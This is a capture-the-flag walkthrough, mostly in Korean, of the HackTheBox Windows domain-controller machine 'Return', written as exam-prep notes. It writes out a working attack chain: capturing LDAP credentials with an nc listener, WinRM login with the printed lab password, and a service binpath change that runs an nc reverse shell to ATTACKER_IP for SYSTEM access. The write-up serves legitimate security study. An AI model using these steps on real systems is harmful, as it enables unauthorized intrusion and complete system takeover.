# Return - HackTheBox

## Target Information

- Machine Name: Return
    
- IP Address: 10.129.95.241
    
- OS: Windows Server 2019
    
- Domain: return.local
    

---

# 1. Enumeration

## Nmap Scan

nmap -sC -sV -Pn 10.129.95.241

### Open Ports

|Port|Service|
|---|---|
|53|DNS|
|80|HTTP|
|88|Kerberos|
|135|MSRPC|
|139|NetBIOS|
|389|LDAP|
|445|SMB|
|5985|WinRM|

### 🔎 설명

- 해당 시스템은 **Domain Controller** 역할을 수행하는 Windows Server임.
    
- 389 (LDAP), 88 (Kerberos), 5985 (WinRM) 포트가 열려 있는 것으로 보아 AD 환경임을 추정 가능.
    
- 초반 공격 벡터는 HTTP 또는 LDAP 기반일 가능성이 높음.
    

---

# 2. Web Enumeration

Port 80 접근 시:

> HTB Printer Admin Panel

feroxbuster -u http://return.local -w /usr/share/dirb/wordlists/common.txt

발견된 경로:

/settings.php

### 🔎 설명

- `settings.php`는 설정 페이지로 보이며, 외부 서버 주소를 입력할 수 있음.
    
- 이런 설정 페이지는 내부적으로 LDAP, SMTP 등의 외부 연결 테스트를 수행하는 경우가 많음.
    
- 즉, **서버 측에서 외부로 인증 요청을 보내는 구조일 가능성 존재**.
    

---

# 3. Initial Access

## 공격 개념

LDAP 서버 주소를 공격자 IP로 변경하고 389 포트를 열어두면,  
웹 애플리케이션이 인증 시도 과정에서 자격 증명을 전송함.

### Listener 실행

```
nc -lvnp 389
```

설정 페이지에서 LDAP Server Address를 공격자 IP로 변경 후 Update 클릭.

### 획득한 자격 증명

return\svc-printer  
Password: 1edFg43012!!

---

### 🔎 한국어 설명

- 웹 애플리케이션이 LDAP 서버와 인증을 시도하면서
    
- 공격자 서버로 NTLM 인증 요청이 전달됨
    
- 그 과정에서 평문 패스워드 노출
    

이 취약점은 흔히 **Credential Disclosure via Misconfigured LDAP** 유형.

---

# 4. WinRM Access

```
evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'
```

접속 성공.

cd C:\Users\svc-printer\Desktop  
type user.txt

---

### 🔎 한국어 설명

- WinRM(5985)이 열려 있었기 때문에 바로 원격 PowerShell 세션 획득 가능
    
- 초기 foothold 확보 완료
    
- 이제 권한 상승 단계 진행
    

---

# 5. Privilege Escalation

## 5.1 그룹 확인

whoami /all

확인된 그룹:

BUILTIN\Server Operators

---

### 🔎 한국어 설명

`Server Operators` 그룹은 매우 강력한 권한을 가짐.

가능한 작업:

- 서비스 시작/중지
    
- 서비스 설정 변경
    
- 일부 시스템 파일 접근
    

⚠️ 서비스는 기본적으로 **LocalSystem 권한으로 실행됨**

→ 즉, 서비스 실행 경로를 조작하면 SYSTEM 권한 코드 실행 가능

---

# 5.2 Reverse Shell 업로드

upload nc64.exe

저장 위치:

C:\ProgramData\nc64.exe

---

### 🔎 한국어 설명

- ProgramData는 일반 사용자도 접근 가능
    
- 서비스에서 실행하기 적합한 경로
    

---

# 5.3 VSS 서비스 악용

공격자 측:

nc -lvnp 443

타겟:

sc.exe config VSS binpath= "C:\Windows\System32\cmd.exe /c C:\ProgramData\nc64.exe -e cmd ATTACKER_IP 443"

서비스 시작:

sc.exe start VSS

---

### 🔎 한국어 설명

- VSS는 Volume Shadow Copy 서비스
    
- LocalSystem 권한으로 실행됨
    
- binpath를 cmd.exe로 변경
    
- cmd.exe가 nc 실행
    
- nc가 공격자에게 reverse shell 연결
    

서비스는 timeout 에러가 나지만  
reverse shell은 살아있음

---

# 6. SYSTEM Shell 획득

Listener 화면:

Connection received  
Microsoft Windows

권한 확인:

whoami

출력:

nt authority\system

---

### 🔎 한국어 설명

- SYSTEM은 Windows 최고 권한
    
- Administrator보다 상위 권한
    
- 완전한 시스템 제어 가능
    

---

# 7. Root Flag 획득

cd C:\Users\Administrator\Desktop  
type root.txt

---

# 8. 공격 체인 요약

## Initial Foothold

LDAP 설정 악용 → 자격 증명 탈취

## Privilege Escalation

Server Operators 그룹 권한 악용  
→ 서비스 실행 경로 조작  
→ SYSTEM reverse shell 획득

---

# 9. 핵심 개념 정리 (시험 대비용)

### 1️⃣ Server Operators = 서비스 제어 가능

### 2️⃣ 서비스는 LocalSystem으로 실행됨

### 3️⃣ binpath 변경 → 임의 코드 실행

### 4️⃣ 서비스 timeout ≠ 실패

### 5️⃣ Windows 권한 상승에서 그룹 열거는 매우 중요

---

# 🔥 공격 구조 다이어그램

Web → LDAP Credential Leak  
       ↓  
WinRM login (svc-printer)  
       ↓  
Server Operators 권한 발견  
       ↓  
Service binpath 조작  
       ↓  
Reverse Shell  
       ↓  
NT AUTHORITY\SYSTEM

---

# 🎯 최종 요약

이 머신의 핵심은:

> "서비스 권한을 이해했는가?"

- AD 환경
    
- 그룹 권한 분석
    
- 서비스 실행 권한 이해
    
- LocalSystem 개념 이해
    

이 네 가지가 핵심 포인트.